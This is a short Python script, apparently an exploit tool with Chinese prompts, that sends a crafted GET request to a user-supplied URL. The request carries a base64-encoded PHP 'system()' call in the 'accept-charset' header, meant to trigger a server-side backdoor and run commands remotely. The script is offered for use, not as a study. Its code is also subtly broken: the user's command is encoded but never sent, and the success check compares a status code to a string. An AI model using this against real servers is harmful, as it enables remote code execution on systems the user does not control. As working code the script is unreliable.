import requests
import base64

def backdoor(url, command="system('calc.exe');"):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36 Edg/77.0.235.27',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-User': '?1',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
        'Sec-Fetch-Site': 'none',
        'accept-charset': 'c3lzdGVtKCdjYWxjLmV4ZScpOw==',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Language': 'zh-CN,zh;q=0.9',
    }

    command = base64.b64encode(command.encode('utf-8'))
    command = str(command, 'utf-8')
    result = requests.get(url, headers=headers, verify=False)
    if result.status_code == "200":
        print("执行完成")
    a = input("任意键退出...")

url = input("输入URL(例如:http://127.0.0.1:228/xx.php)\n")
command = input("输入命令 默认为 system('calc.exe'); (不想输入直接回车)\n")
backdoor(url, command)
